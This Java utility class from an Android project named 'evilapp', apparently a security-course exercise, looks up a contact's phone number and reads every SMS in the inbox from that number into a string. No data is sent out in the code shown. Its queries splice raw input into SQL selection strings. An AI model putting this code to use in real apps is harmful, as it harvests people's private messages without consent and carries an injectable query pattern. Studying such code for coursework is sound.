package com.cs155.evilapp;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

public class Utils {


    public static String[] parseContactName(String input) {
        //remove header and enter character
        input = input.replace("Contact:", "").replace("\n", "");
        String[] contactName = input.split("Name: ");
        return contactName;
    }

    public static String getPhoneNumber(Context context, String name) {
        String phoneNumber = null;
        String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " like'%" + name + "%'";
        String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
        Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection, selection, null, null);
        if (c.moveToFirst()) {
            phoneNumber = c.getString(0);
        }
        c.close();
        if (phoneNumber == null)
            phoneNumber = "Unsaved";
        return phoneNumber;
    }

    public static String getMessagesFromNumber(Context context, String number) {
        StringBuilder smsBuilder = new StringBuilder();
        final String SMS_URI_INBOX = "content://sms/inbox";
        try {
            Uri uri = Uri.parse(SMS_URI_INBOX);
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
            Cursor cur = context.getContentResolver().query(uri, projection, "address='" + number + "'", null, "date desc");
            if (cur.moveToFirst()) {
                int indexAddress = cur.getColumnIndex("address");
                int indexPerson = cur.getColumnIndex("person");
                int indexBody = cur.getColumnIndex("body");
                int indexDate = cur.getColumnIndex("date");
                int indexType = cur.getColumnIndex("type");
                do {
                    String strAddress = cur.getString(indexAddress);
                    int intPerson = cur.getInt(indexPerson);
                    String strbody = cur.getString(indexBody);
                    long longDate = cur.getLong(indexDate);
                    int int_Type = cur.getInt(indexType);

                    smsBuilder.append("[ ");
                    smsBuilder.append(strAddress + ", ");
                    smsBuilder.append(intPerson + ", ");
                    smsBuilder.append(strbody + ", ");
                    smsBuilder.append(longDate + ", ");
                    smsBuilder.append(int_Type);
                    smsBuilder.append(" ]\n\n");
                } while (cur.moveToNext());

                if (!cur.isClosed()) {
                    cur.close();
                    cur = null;
                }
            } else {
                smsBuilder.append("no messages!");
            } // end if
        } catch (SQLiteException ex) {
            Log.d("SQLiteException", ex.getMessage());
        }
        return smsBuilder.toString();
    }
}
